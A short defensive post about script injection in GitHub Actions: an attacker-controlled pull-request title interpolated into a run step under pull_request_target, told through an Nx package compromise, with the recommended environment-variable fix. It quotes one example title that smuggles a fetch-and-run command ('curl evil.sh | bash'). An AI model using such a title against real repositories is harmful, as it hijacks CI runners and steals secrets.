In August 2025, someone opened a pull request against Nx with shell commands hidden in the title. A title-validation workflow read that title into a run step, and the runner executed the commands with the repository's token. The attacker grabbed the npm publishing key, pushed malicious Nx packages for four hours, and the malware leaked 2,349 secrets off developer machines.

The break comes from two lines a lot of teams ship. A lint workflow runs on pull_request_target, so it carries the base repo's GITHUB_TOKEN and secrets even when the PR comes from a fork. Then a run step writes ${{ github.event.pull_request.title }} into the shell. Actions substitutes that expression before the shell parses the line, so a title like "; curl evil.sh | bash turns into a command the runner obeys. Datadog's 2026 State of DevSecOps report found this pattern, script injection or a dangerous trigger, in 38 percent of organizations.

The GitHub docs give the fix. Never interpolate untrusted input into a run block. Bind the title to an intermediate environment variable, then reference "$TITLE" in quotes inside the script, so the shell reads it as a string. Branch names and issue bodies need the same handling.

On June 18 2026, actions/checkout v7 stopped fetching fork PR code under pull_request_target by default. You opt back in with allow-unsafe-pr-checkout once you have read the guidance. The backport to older majors lands July 16, so a workflow pinned to actions/checkout@v4 picks up the guard too.

Treat every value an outsider controls as a string you quote. Audit your run steps for raw github.event interpolation this week, before someone else reads them first.

#GitHubActions #CICD #DevSecOps #SupplyChainSecurity #DevOps
